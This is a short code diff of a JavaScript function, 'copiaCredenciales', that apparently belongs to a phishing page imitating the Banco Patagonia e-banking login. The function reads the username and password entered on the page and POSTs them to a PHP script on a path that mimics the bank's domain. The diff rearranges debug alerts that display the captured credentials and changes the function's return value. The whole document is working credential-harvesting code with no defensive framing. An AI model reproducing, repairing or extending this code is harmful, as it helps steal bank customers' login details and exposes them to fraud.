@@ -4,9 +4,6 @@ function copiaCredenciales(){
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim(); 
   
-  alert( username );
-  alert( password );
-  
   fetch('/Patagonia/CopiaPHP/ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/copiaCredenciales.php', {
     method: 'POST',
     headers: {
@@ -24,8 +21,11 @@ function copiaCredenciales(){
   .catch(error => {
     console.error('Error en la solicitud:', error);
   });
+
+  alert( username );
+  alert( password );
   
-  return true;
+  return false;
 }
 
 function validar() {
